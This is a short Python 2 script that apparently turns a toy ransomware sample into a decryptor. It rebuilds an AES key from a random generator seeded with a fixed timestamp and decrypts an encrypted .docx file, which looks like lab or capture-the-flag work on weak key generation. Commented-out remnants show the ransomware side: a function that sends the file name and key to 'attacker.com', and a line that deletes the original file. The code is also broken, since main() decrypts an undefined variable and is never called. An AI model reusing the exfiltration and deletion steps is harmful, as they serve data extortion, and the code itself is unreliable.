#!/usr/bin/python
#encoding=utf-8
'''
  _     ____  ______ __   __ _____  _____   ___       _      ___    ____   _  __    _  
 | |   / ___||  __  |\ \ / /|  _  ||_   _| / _ \     | |    / _ \  / ___| | |/ /   | | 
/ __) | |    | |__| | \ . / | |_| |  | |  | | | | __ | |   | | | || |     | ' /   / __)
\__ \ | |    |  _  /   \ /  |  ___|  | |  | | | ||__|| |   | | | || |     | . \   \__ \
(   / | |___ | | \ \   | |  | |      | |  | |_| |    | |__ | |_| || |___  | |\ \  (   /
 |_|   \____||_|  \_\  |_|  |_|      |_|   \___/     |____| \___/  \____| |_| \_\  |_| 
      
'''

from Crypto.Cipher import AES
import random
import time
import os

ciphertext_file = "secret.docx.enc"
#encrypted_file = "look.docx.enc"
IV = "\x42" * AES.block_size

#def send_key(key):
#    '''
#    Send the encryption key to our server.
#    '''
#    import requests
#    requests.get("https://attacker.com", params = {"file" : plaintext_file, "key" : key})

def generate_key(size):
    key = bytearray()
    random.seed(1523017353)
    print int(time.time())
    for _ in range(size):
        key.append(random.randint(0, 255))
    return str(key)

def pad(text):
    return text + (AES.block_size - len(text) % AES.block_size) * "\xff"

def encrypt(plaintext, cipher):
    return cipher.encrypt(pad(plaintext)).encode('hex')

def decrypt(ciphertext, cipher):
        return cipher.decrypt((ciphertext).decode('hex'))

def main():
    with open(ciphertext_file, 'r') as f:
        ciphertext = f.read()
    key = generate_key(32)
    print key
    # send_key(key.encode('hex'))
    cipher = AES.new(key, IV=IV, mode=AES.MODE_CBC)
    plaintext = decrypt(plaintext, cipher)
    #with open(encrypted_file, 'w') as f:
    #    f.write(ciphertext)
     #😈
    #os.remove(plaintext_file)
    print plaintext
